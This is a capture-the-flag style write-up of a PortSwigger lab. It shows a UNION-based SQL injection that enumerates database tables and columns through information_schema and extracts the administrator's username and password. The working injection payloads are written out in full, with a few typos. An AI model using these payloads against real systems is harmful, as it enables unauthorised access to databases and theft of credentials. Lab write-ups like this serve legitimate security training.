+++
title = 'Sql Injection'
date = 2024-07-19T16:26:59+05:30
slug = "portswigger-SQL-database-listing"
categories = ["portswigger","SQL injection","listing databsse contents","non oracle databases"]
+++


![](https://drive.google.com/file/d/1SQCUk4gOo21_JNwo6_-taQhO5KmwX8X9/view?usp=sharing)

From the lab description This lab contains SQL injection Vulnerability in Product category filter 
to solve this lab we need to login as administrator 
this lab contains non oracle databases

refer to [SQL CHEAT SHEET](../SQL%20CHEAT%20SHEET.md) for payloads
Let's access the lab 
like as usual we've intercepted the request and sent it to repeater now let's check number of columns and determine the data type of those columns to perform a union attack 

![](https://drive.google.com/file/d/1-u2vJ8D2krjj1S2OKBWbONyqU-S7XH6d/view?usp=sharing)

we got internal server error of we dfo order by 3 so number of columns is 2 now let's determine the datatype of those columns The payload is 
`'+UNION+SELECT+'abc','def'-- `
![](https://drive.google.com/file/d/1xztTAH6BrxIad8xq1CbaKWTkRo_H_aoV/view?usp=sharing)

so we now know that both columns are of same data type let's now retrieve the username and password for the file 

![](https://drive.google.com/file/d/1E_oughRu5rBXV5ieDXAW0LBIw8j92gUc/view?usp=sharing)


payload to retrieve information about list of tables in database

`+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

We got some list of tables let's check them
![](https://drive.google.com/file/d/1hrYETyyNKxdk_IwVUh_Px5aj4HuZE6CJ/view?usp=sharing)


![](https://drive.google.com/file/d/18kxGQpYfJDOUlggkIfie3batN5NaolGh/view?usp=sharing)

the above is the user table 



to retrieve the usernames the payload will be 
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_avyrcv'--

![](https://drive.google.com/file/d/1GLoJ0VcvUa5G1UkLbadrdmzDhhdvY5dY/view?usp=sharing)

we got a username table and a match with word starting with pass that might be the password table 


username_umpehj


The payload to view password table will be 

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='password_ohgyxof'--



we got our password table too
let's retrieve the details form both tables 

The paylaod will be 


username table : users_avyrcv
password table : password_ohgyxo
username: username_umpehj

'+UNION+SELECT+username_umpehj,+ password_ohgyxo+FROM+users_avyrcv--

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_avyrcv'--

![](https://drive.google.com/file/d/1vHVScbpiMZKKtG39CNwcLo1QJm2OCUpZ/view?usp=sharing)

let's find administrator details and login 

![](https://drive.google.com/file/d/1Vo2juvuNE7S8_NGcxmHncKOotAoee5hJ/view?usp=sharing)

now let's login

![](https://drive.google.com/file/d/1mWq0Yc-aVngUQKCuV102mGzdlvfkIPhj/view?usp=sharing)



